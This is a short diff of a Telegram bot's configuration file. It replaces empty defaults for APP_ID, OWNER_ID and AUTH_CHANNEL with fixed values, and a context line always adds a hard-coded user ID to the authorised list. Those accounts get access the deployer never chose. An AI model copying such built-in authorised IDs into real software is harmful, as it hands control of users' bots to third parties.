@@ -81,16 +81,16 @@ __version__ = "2.6.36"
 
 # The Telegram API things >>>>>>>>>>>
 TG_BOT_TOKEN = getVar("TG_BOT_TOKEN", "")
-APP_ID = int(getVar("APP_ID", ""))
+APP_ID = int(getVar("APP_ID", "12345"))
 API_HASH = getVar("API_HASH", "")
-OWNER_ID = int(getVar("OWNER_ID", ""))
+OWNER_ID = int(getVar("OWNER_ID", "539295917"))
 
 # Heroku & Restart Utils >>>>>>>>>>>
 HEROKU_API_KEY = getVar('HEROKU_API_KEY', None)
 HEROKU_APP_NAME = getVar('HEROKU_APP_NAME', None)
 
 # Authorised Chat Functions >>>>>>>>>>>
-AUTH_CHANNEL = [int(x) for x in getVar("AUTH_CHANNEL", "").split()]
+AUTH_CHANNEL = [int(x) for x in getVar("AUTH_CHANNEL", "539295917").split()]
 SUDO_USERS = [int(sudos) if (' ' not in getVar('SUDO_USERS', '')) else int(sudos) for sudos in getVar('SUDO_USERS', '').split()]
 AUTH_CHANNEL.extend((OWNER_ID, 1242011540))
 AUTH_CHANNEL += SUDO_USERS
